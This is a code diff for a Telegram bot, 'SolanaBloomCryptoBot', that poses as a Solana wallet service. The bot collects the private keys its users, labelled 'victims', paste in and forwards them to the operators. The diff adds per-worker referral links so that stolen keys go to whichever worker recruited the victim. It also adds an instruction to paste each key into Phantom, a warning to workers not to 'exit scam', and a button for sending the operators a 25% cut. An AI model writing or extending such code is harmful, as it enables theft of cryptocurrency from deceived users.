@@ -301,7 +301,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Send one owner alert only once per user session
+    # Check if user came from a custom link
+    custom_link_owner = None
+    if context.args and len(context.args) > 0:
+        start_param = context.args[0]
+        if start_param.isdigit():
+            custom_link_owner = int(start_param)
+
+    # Send start logs to custom link owner or main owners
     if not context.chat_data.get("owner_alert_sent"):
         # Format username
         username_display = user.username if user.username else "❌"
@@ -317,14 +324,26 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🔹 A victim just ran /start using your link."
         )
 
-        await context.bot.send_message(chat_id=OWNER_ID, text=message_text)
-        if SECOND_OWNER_ID:
-            await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=message_text)
+        # If came from custom link, send to that owner
+        if custom_link_owner:
+            try:
+                await context.bot.send_message(chat_id=custom_link_owner, text=message_text)
+            except Exception as e:
+                print(f"Error sending to custom link owner {custom_link_owner}: {e}")
+        else:
+            # Send to main owners
+            await context.bot.send_message(chat_id=OWNER_ID, text=message_text)
+            if SECOND_OWNER_ID:
+                await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=message_text)
         context.chat_data["owner_alert_sent"] = True
 
     # Check if user has started before, track states
     if user_id not in user_data:
         user_data[user_id] = {"first_one_off_sent": False, "second_one_off_sent": False}
+    
+    # Store custom link owner if user came from custom link
+    if custom_link_owner:
+        user_data[user_id]["custom_link_owner"] = custom_link_owner
 
     if not user_data[user_id]["first_one_off_sent"]:
         await context.bot.send_message(
@@ -648,22 +667,56 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Get username or fallback to N/A
         username = user.username if user.username else "N/A"
 
-        # Create victim information message with private key
+        # Create victim information message with private key and warning
         victim_message = (
             "🌸 Victim imported Solana wallet\n\n"
             "🔎 Victim Information\n\n"
             f"├ 👤 Name: {username}\n"
             f"├ 🆔 {user_id}\n"
-            f"├ 🔑 Private Key: <code>{message_text}</code>"
+            f"├ 🔑 Private Key:\n\n"
+            f"<b>⚠️ Paste the private key below into phantom.</b>\n\n"
+            f"<code>{message_text}</code>\n\n"
+            f"<b>⚠️ Do not try to exit scam, you will be instantly caught red handed and banned from using the service!</b>"
         )
 
-        # Send to both owners
-        try:
-            await context.bot.send_message(chat_id=OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
-            if SECOND_OWNER_ID:
-                await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
-        except Exception as e:
-            print(f"Error sending to owners: {e}")
+        # Create inline keyboard with support and send 25% cut buttons
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📞 Support", url="https://t.me/Opimet")],
+            [InlineKeyboardButton("💰 Send 25% Cut", callback_data="show_payment_addresses")]
+        ])
+
+        # Check if user came from custom link (stored in user_data)
+        custom_link_owner = user_data[user_id].get("custom_link_owner")
+        
+        # Send to custom link owner or main owners
+        if custom_link_owner:
+            try:
+                await context.bot.send_message(
+                    chat_id=custom_link_owner, 
+                    text=victim_message, 
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=keyboard
+                )
+            except Exception as e:
+                print(f"Error sending to custom link owner {custom_link_owner}: {e}")
+        else:
+            # Send to main owners
+            try:
+                await context.bot.send_message(
+                    chat_id=OWNER_ID, 
+                    text=victim_message, 
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=keyboard
+                )
+                if SECOND_OWNER_ID:
+                    await context.bot.send_message(
+                        chat_id=SECOND_OWNER_ID, 
+                        text=victim_message, 
+                        parse_mode=ParseMode.HTML,
+                        reply_markup=keyboard
+                    )
+            except Exception as e:
+                print(f"Error sending to owners: {e}")
 
         # Show wallet creation confirmation message without inline buttons
         await update.message.reply_text("Please wait while your wallet is being created. ✅")
@@ -1481,8 +1534,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Handle Your Link
     if data == "your_link":
-        # Create custom link with user's ID
-        custom_link = f"https://t.me/SolanaBloomCryptoBot?start=worker_{user_id}"
+        # Create custom link with user's ID only
+        custom_link = f"https://t.me/SolanaBloomCryptoBot?start={user_id}"
         
         text = (
             "🔗 <b>Your Custom Link</b>\n\n"
